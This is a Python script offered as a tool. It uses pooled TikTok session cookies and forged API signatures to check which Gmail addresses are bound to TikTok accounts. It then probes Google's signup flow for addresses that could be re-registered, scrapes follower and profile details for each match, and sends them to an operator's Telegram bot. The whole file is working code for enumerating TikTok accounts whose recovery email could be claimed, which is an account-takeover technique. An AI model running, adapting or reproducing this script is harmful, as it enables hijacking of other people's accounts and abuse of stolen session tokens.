import os,sys
import requests,time,secrets,threading,string,uuid
from random import choice,randrange,randint
from uuid import uuid4
from MedoSigner import Argus,Gorgon, md5,Ladon
from urllib.parse import urlencode
import random,re,json,SignerPy,binascii
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent as user_agent
try:
    import telebot 
except:
    os.system('pip install telebot')
    os.system('pip install Pytelegrambotapi==3.7.7')
    os.system('pip install SignerPy==0.12.0')   
    os.system('clear')
    import telebot

Z = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
C = "\033[1;97m"
B = '\033[2;36m'
Y = '\033[1;34m'
C = "\033[1;97m"
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'

idd = input(B+"Enter ID : ")
tok = input(B+"Enter Token : ")
fileuser = input(f'{S}Write Name File username : ')
speed = 5
os.system('clear')

ya = 0
no = 0
nod = 0
yas = 0

ss = requests.get("https://raw.githubusercontent.com/is-L7N/session_keys/refs/heads/main/github.txt").text.splitlines()
dv = []
for ln in requests.get("https://raw.githubusercontent.com/is-L7N/dv2/refs/heads/main/dv.txt").text.splitlines():
    tk = ln.strip().split(":")
    if len(tk) >= 2:
        dv.append((tk[0], tk[1]))

print(f" Activated. Please wait a few seconds. ")

def get_user_id(username):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
    }
    try:
        tikinfo = requests.get(f'https://www.tiktok.com/@{username}', headers=headers).text
        info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommenUserList"')[0]
        user_id = str(info.split('id":"')[1]).split('",')[0]
        return user_id
    except:
        return None

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
    data=payload
    if not unix: unix = int(time.time())
    return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}   

def get_level(username):
    try:
        user_id = get_user_id(username)
        if not user_id:
            return "N/A"
            
        url = "https://webcast16-normal-no1a.tiktokv.eu/webcast/user/?request_from=profile_card_v2&request_from_scene=1&target_uid="+str(user_id)+"&iid="+str(random.randint(1, 10**19))+"&device_id="+str(random.randint(1, 10**19))+"&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid="+str(binascii.hexlify(os.urandom(8)).decode())+"&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632"+"&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts="+str(round(random.uniform(1.2, 1.6) * 100000000) * -1)+"&cdid="+str(uuid.uuid4())+"&webcast_sdk_version=2920&webcast_language=ar&webcast_locale=ar_IQ"	
        headers = {'User-Agent': "com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)"}
        headers.update(sign(url.split('?')[1], '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233))
        response = requests.get(url, headers=headers)
        level_match = re.search(r'"default_pattern":"(.*?)"', response.text)
        if level_match:
            level_text = level_match.group(1)
            if 'المستوى رقم' in level_text:
                return level_text.split('المستوى رقم')[1].strip()
            else:
                return "N/A"
        else:
            return "N/A"
    except Exception as e:
        return "N/A"

def info(email):
    username = email.split('@')[0]
    headers = {
        'User-Agent': str(user_agent()),
        'Accept-Language': 'en-US,en;q=0.9',
    }
    try:
        url = f"https://www.tiktok.com/@{username}"
        response = requests.get(url, headers=headers, timeout=15)
        html = response.text
        
        level = get_level(username)
        
        m = re.search(r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__".*?>(.*?)</script>', html)
        if not m:
            ff = f"""
[+] username : @{username}
[+] email : {email}
[+] By : @oo22bb
            """
            requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
                          params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})
            print(ff)
            return

        data_json = json.loads(m.group(1))
        iinfo = data_json['__DEFAULT_SCOPE__']['webapp.user-detail']['userInfo']
        user_obj = iinfo['user']
        stats = iinfo['stats']
        
        account_data = {
            'id': user_obj.get('id', 'N/A'),
            'user': user_obj.get('uniqueId', username),
            'name': user_obj.get('nickname', 'N/A'),
            'folos': format(stats.get('followerCount', 0), ',d'),
            'folon': format(stats.get('followingCount', 0), ',d'),
            'priv': 'True' if user_obj.get('privateAccount') else 'False',
            'lik': format(stats.get('heartCount', 0), ',d'),
            'vid': format(stats.get('videoCount', 0), ',d'),
            'verified': 'True' if user_obj.get('verified') else 'False'
        }

        ff = f"""
[+] hits : {yas}
[+] username : @{account_data['user']}
[+] email : {email}
[+] name : {account_data['name']}
[+] followers : {account_data['folos']}
[+] following : {account_data['folon']}
[+] likes : {account_data['lik']}
[+] id : {account_data['id']}
[+] private : {account_data['priv']}
[+] videos : {account_data['vid']}
[+] verified : {account_data['verified']}
[+] Level : {level}
[+] By : @oo22bb
        """.strip()
        print(ff)
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
                      params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})

    except Exception as e:
        ff = f"""
[+] hits : {yas}
[+] username : @{username}
[+] email : {email}
[+] By : @oo22bb
        """.strip()
        print("خطأ:", e)
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
                      params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})

def check_gmail(email):
    global ya, no, yas, nod
    if '@' in email:
        email = email.split('@')[0]
    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
        return False
    s = requests.Session()
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://accounts.google.com/',
            'upgrade-insecure-requests': '1',
            'user-agent': str(user_agent()),
            'x-browser-channel': 'stable',
            'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
            'x-browser-year': '2024',
        }
        params = {
            'biz': 'false',
            'continue': 'https://mail.google.com/mail/u/0/',
            'ddm': '1',
            'emr': '1',
            'flowEntry': 'SignUp',
            'flowName': 'GlifWebSignIn',
            'followup': 'https://mail.google.com/mail/u/0/',
            'osid': '1',
            'service': 'mail',
        }
        response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
        tl = response.url.split('TL=')[1]
        s1 = response.text.split('"Qzxixc":"')[1].split('"')[0]
        at = response.text.split('"SNlM0e":"')[1].split('"')[0]
    except:
        pass
    
    try:
        name = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for i in range(randrange(5,10)))
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': str(user_agent()),
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }
        params = {
            'rpcids': 'E815hb',
            'source-path': '/lifecycle/steps/signup/name',
            'hl': 'en-US',
            'TL': tl,
            'rt': 'c',
        }
        data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)
        response = s.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
        ).text
        if 'steps/signup/birthdaygender' in response:
            pass
    except:
        pass
    
    try:
        birthday = randrange(1980,2010), randrange(1,12), randrange(1,28)
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': str(user_agent()),
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }
        params = {
            'rpcids': 'eOY7Bb',
            'source-path': '/lifecycle/steps/signup/birthdaygender',
            'hl': 'en-US',
            'TL': tl,
            'rt': 'c',
        }
        data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)
        response = s.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
        ).text
        if 'steps/signup/username' in response:
            pass
    except:
        pass
    
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': str(user_agent()),
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }
        params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'hl': 'en-US',
            'TL': tl,
            'rt': 'c',
        }
        data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)
        response = s.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,
            headers=headers,
            data=data,
        ).text
        email_full = email + '@gmail.com'
        if 'steps/signup/password' in response:
            yas += 1
            os.system('clear')
            sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
  \033[1;32m [+] hits\033[0m  : \033[1;36m{yas}\033[0m  
  \033[1;34m [+] g.tik \033[0m  : \033[1;33m{ya}\033[0m   
  \033[1;33m [+] b.tik \033[0m  : \033[1;31m{no}\033[0m   
  \033[1;31m [+] b.gma \033[0m  : \033[1;35m{nod}\033[0m  
  \033[1;36m [+] email \033[0m  : \033[1;32m{email}\033[0m>
  \033[1;36m [+] By \033[0m  : \033[1;32m@OO22BB\033[0m 
\033[1;35m - — — — — — — — — — — — — —\033[0m
''')
            sys.stdout.flush()
            info(email_full)
        else:
            os.system('clear')
            nod += 1
            sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
  \033[1;32m [+] hits\033[0m  : \033[1;36m{yas}\033[0m  
  \033[1;34m [+] g.tik \033[0m  : \033[1;33m{ya}\033[0m   
  \033[1;33m [+] b.tik \033[0m  : \033[1;31m{no}\033[0m   
  \033[1;31m [+] b.gma \033[0m  : \033[1;35m{nod}\033[0m  
  \033[1;36m [+] email \033[0m  : \033[1;32m{email}\033[0m>
  \033[1;36m [+] By \033[0m  : \033[1;32m@OO22BB\033[0m 
\033[1;35m - — — — — — — — — — — — — —\033[0m
''')
            sys.stdout.flush()
    except:
        print('gg')

def chzm(user):
    global ya, no, yas, nod
    email = user + '@gmail.com'
    
    pm = {
        'device_platform': 'android', 
        'ssmix': 'a', 
        'locale': 'en', 
        'language': 'en', 
        'channel': 'googleplay', 
        'aid': "1233", 
        'app_name': 'musical_ly', 
        'version_code': '360505', 
        'version_name': '36.5.5', 
        'manifest_version_code': '2023605050', 
        'update_version_code': '2023605050', 
        'ab_version': '36.5.5', 
        'os_version': '10', 
        "device_id": 0, 
        'app_version': '30.1.2', 
        "request_from": "profile_card_v2", 
        "request_from_scene": '1', 
        "scene": "1", 
        "mix_mode": "1", 
        "os_api": "34", 
        "ac": "wifi", 
        "request_tag_from": "h5"
    }
    pm.update({'device_type': f'rk{random.randint(3000,4000)}s_{uuid.uuid4().hex[:4]}'})
    
    pm = SignerPy.get(params=pm)
    hh = {'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux;U;Android 7.1.2;en;SM-N975F;Build/N2G48H;tt-ok/{random.randint(1,10**19)})'}
    ck = {"sessionid": random.choice(ss)}
    dt = {'email': email}
    
    di, ii = random.choice(dv)
    pm.update({"device_id": di, "iid": ii})
    
    ur = f'https://{random.choice(["api31-normal-useast2a.tiktokv.com","api22-normal-c-alisg.tiktokv.com","api2.musical.ly","api16-normal-no1a.tiktokv.eu","rc-verification-sg.tiktokv.com","api31-normal-alisg.tiktokv.com","api16-normal-c-useast1a.tiktokv.com","api22-normal-c-useast1a.tiktokv.com","api16-normal-c-useast1a.musical.ly","api19-normal-c-useast1a.musical.ly","api.tiktokv.com","www.tiktok.com","log2.musical.ly","webcast.musical.ly","inapp.tiktokv.com","api2-19-h2.musical.ly"])}/passport/email/bind_without_verify/'

    sg = SignerPy.sign(params=pm, cookie=ck, data=dt)
    hh.update(sg)
    
    try:
        rs = requests.post(ur, data=dt, headers=hh, params=pm, cookies=ck).text        
        if "Email is linked to another account. Unlink or try another email." in rs:
            os.system('clear')
            ya += 1
            sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
  \033[1;32m [+] hits\033[0m  : \033[1;36m{yas}\033[0m  
  \033[1;34m [+] g.tik \033[0m  : \033[1;33m{ya}\033[0m   
  \033[1;33m [+] b.tik \033[0m  : \033[1;31m{no}\033[0m   
  \033[1;31m [+] b.gma \033[0m  : \033[1;35m{nod}\033[0m  
  \033[1;36m [+] email \033[0m  : \033[1;32m{email}\033[0m>
  \033[1;36m [+] By \033[0m  : \033[1;32m@OO22BB\033[0m 
\033[1;35m - — — — — — — — — — — — — —\033[0m
''')
            sys.stdout.flush()
            check_gmail(user)
        else:
            os.system('clear')
            no += 1
            sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
  \033[1;32m [+] hits\033[0m  : \033[1;36m{yas}\033[0m  
  \033[1;34m [+] g.tik \033[0m  : \033[1;33m{ya}\033[0m   
  \033[1;33m [+] b.tik \033[0m  : \033[1;31m{no}\033[0m   
  \033[1;31m [+] b.gma \033[0m  : \033[1;35m{nod}\033[0m  
  \033[1;36m [+] email \033[0m  : \033[1;32m{email}\033[0m>
  \033[1;36m [+] By \033[0m  : \033[1;32m@OO22BB\033[0m 
\033[1;35m - — — — — — — — — — — — — —\033[0m
''')
            sys.stdout.flush()
    except Exception as e:
        os.system('clear')
        no += 1
        sys.stdout.write(f'''\r
\033[1;35m - — — — — — — — — — — — — —\033[0m
  \033[1;32m [+] hits\033[0m  : \033[1;36m{yas}\033[0m  
  \033[1;34m [+] g.tik \033[0m  : \033[1;33m{ya}\033[0m   
  \033[1;33m [+] b.tik \033[0m  : \033[1;31m{no}\033[0m   
  \033[1;31m [+] b.gma \033[0m  : \033[1;35m{nod}\033[0m  
  \033[1;36m [+] email \033[0m  : \033[1;32m{email}\033[0m>
  \033[1;36m [+] By \033[0m  : \033[1;32m@OO22BB\033[0m 
\033[1;35m - — — — — — — — — — — — — —\033[0m
''')
        sys.stdout.flush()

def main():
    try:
        with open(fileuser, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    except:
        print('File Username not found!')
        exit()
    with ThreadPoolExecutor(max_workers=speed) as executor:
        executor.map(chzm, users)        
if __name__ == "__main__":
    main()
